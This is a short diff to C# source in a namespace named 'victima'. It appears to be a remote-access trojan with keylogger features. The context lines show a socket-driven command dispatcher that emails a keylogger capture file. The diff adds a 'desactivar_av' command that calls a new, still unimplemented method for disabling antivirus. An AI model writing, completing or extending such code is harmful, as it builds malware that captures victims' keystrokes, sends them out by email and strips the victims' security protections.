@@ -253,6 +253,10 @@ namespace victima
                                     Mandar_email_archivo_keylogger();
                                     sw.WriteLine("Email Enviado con attach el:" + new DateTime().ToString());
                                     break;
+                                case "desactivar_av":
+                                    DesactivarAntivirus();
+                                    sw.WriteLine("SW AV cmd llamado el:" + new DateTime().ToString());
+                                    break;
                                 default:
                                     write_log("yapues");
                                     sw.WriteLine("no reconocido,echo:" + initial_command);
@@ -276,6 +280,11 @@ namespace victima
                 }
                 soc.Close();
             }
+        }
+
+        private static void DesactivarAntivirus()
+        {
+            throw new NotImplementedException();
         }
 
 
